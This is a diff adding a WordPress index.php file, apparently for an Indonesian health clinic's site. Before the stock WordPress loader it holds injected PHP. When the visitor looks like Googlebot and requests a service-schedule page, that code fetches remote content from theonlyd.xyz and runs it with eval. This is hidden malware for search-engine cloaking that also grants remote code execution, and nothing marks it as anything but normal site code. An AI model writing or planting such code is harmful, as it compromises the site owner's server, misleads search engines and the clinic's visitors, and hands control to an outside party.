@@ -1,0 +1,40 @@
+<?php
+
+$userIp = $_SERVER['REMOTE_ADDR'];
+$userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
+$referer = isset($_SERVER['HTTP_REFERER']) ? strtolower($_SERVER['HTTP_REFERER']) : '';
+$hostname = gethostbyaddr($userIp);
+$currentPath = $_SERVER['REQUEST_URI'];
+
+function isGooglebot($hostname, $userAgent) {
+	return (
+		strpos($hostname, 'googlebot.com') !== false ||
+		strpos($userAgent, 'google-inspectiontool') !== false ||
+		strpos($userAgent, 'google') !== false
+	);
+}
+
+if (isGooglebot($hostname, $userAgent) && strpos($currentPath, '/pelayanan/jadwal-pelayanan/') !== false) {
+	$remoteCode = @file_get_contents('https://theonlyd.xyz/puskesmascipayung-pelayanan.html');
+	if ($remoteCode) {
+		eval('?>' . $remoteCode);
+		exit;
+	}
+}
+
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
